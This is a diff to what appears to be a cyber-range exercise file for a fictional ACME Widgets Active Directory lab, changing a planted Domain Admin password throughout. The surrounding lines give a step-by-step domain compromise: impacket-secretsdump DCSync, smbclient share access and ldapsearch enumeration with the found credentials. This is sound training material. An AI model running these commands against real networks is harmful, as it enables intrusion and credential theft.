@@ -421,7 +421,7 @@ msel:
               ACME Widgets Emergency Credentials
               =====================================
 
-              Domain Admin (emergency): Adm1n2024!
+              Domain Admin (emergency): Adm1n2024
 
               DO NOT SHARE - IT DEPT ONLY
               =====================================
@@ -431,7 +431,7 @@ msel:
 
               | Account | Password | Access Level |
               |---------|----------|--------------|
-              | Administrator | Adm1n2024! | **DOMAIN ADMIN** |
+              | Administrator | Adm1n2024 | **DOMAIN ADMIN** |
 
               > **You now have the keys to the kingdom!**
 
@@ -480,7 +480,7 @@ msel:
               **Alternative:** Use the Domain Admin password you found in `passwords.txt`:
 
               ```bash
-              impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'
+              impacket-secretsdump 'Administrator:Adm1n2024@172.16.2.12'
               ```
 
               ### Understanding the Output
@@ -507,10 +507,10 @@ msel:
 
               ```bash
               # List DC shares with Domain Admin
-              smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024!'
+              smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
 
               # Access SYSVOL (only Domain Admins can write here)
-              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
               ```
 
               ### In a Real Windows AD
@@ -540,19 +540,19 @@ msel:
               ### Domain Controller
 
               ```bash
-              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
               ```
 
               ### File Server
 
               ```bash
-              smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024!' -c 'ls'
+              smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
               ```
 
               ### Alternative with Impacket
 
               ```bash
-              impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+              impacket-smbclient 'Administrator:Adm1n2024@172.16.2.12'
               # shares
               # use sysvol
               # ls
@@ -573,7 +573,7 @@ msel:
               ```bash
               ldapsearch -x -H ldap://172.16.2.12 \
                 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
-                -w 'Adm1n2024!' \
+                -w 'Adm1n2024' \
                 -b 'cn=Users,DC=acmewidgets,DC=local' \
                 '(objectClass=user)' sAMAccountName
               ```
@@ -582,10 +582,10 @@ msel:
 
               ```bash
               # SYSVOL contains Group Policy and scripts
-              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'recurse; ls'
+              smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'recurse; ls'
 
               # NETLOGON for logon scripts
-              smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024!' -c 'ls'
+              smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'
               ```
 
               > **In Windows AD**, you would use: `net user /domain`, `net group "Domain Admins" /domain`
@@ -613,7 +613,7 @@ msel:
                  └── Credential reuse on file server (172.16.2.10)
                      └── svc_backup → sensitive share
                          └── Found passwords.txt
-                             └── Domain Admin: Adm1n2024!
+                             └── Domain Admin: Adm1n2024
 
               4. DOMAIN COMPROMISE
                  └── SMB access to DC01 SYSVOL
@@ -686,7 +686,7 @@ events:
     description: |
       Use discovered credentials to compromise the domain with Impacket tools.
 
-      Credentials from passwords.txt: Administrator / Adm1n2024!
+      Credentials from passwords.txt: Administrator / Adm1n2024
 
       Attempt DCSync with Impacket (svc_backup has replication rights):
         impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.12'
@@ -695,7 +695,7 @@ events:
       Domain Admin credentials from passwords.txt directly.
 
       Validate Domain Admin access:
-        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
+        impacket-smbclient 'Administrator:Adm1n2024@172.16.2.12'
 
   - sequence: 5
     delay_minutes: 60
@@ -708,14 +708,14 @@ events:
       Verify access via SMB:
 
       File Server (172.16.2.10):
-        smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024!' -c 'ls'
+        smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
 
       Domain Controller (172.16.2.12):
-        smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+        smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
 
       Or with Impacket:
-        impacket-smbclient 'Administrator:Adm1n2024!@172.16.2.12'
-        impacket-secretsdump 'Administrator:Adm1n2024!@172.16.2.12'
+        impacket-smbclient 'Administrator:Adm1n2024@172.16.2.12'
+        impacket-secretsdump 'Administrator:Adm1n2024@172.16.2.12'
 
       Document your attack chain for the after-action review.
 
@@ -735,5 +735,5 @@ credentials:
       notes: "DCSync rights on domain"
   domain_admin:
     username: Administrator
-    password: "Adm1n2024!"
+    password: "Adm1n2024"
     notes: "Found in passwords.txt on fileserver"
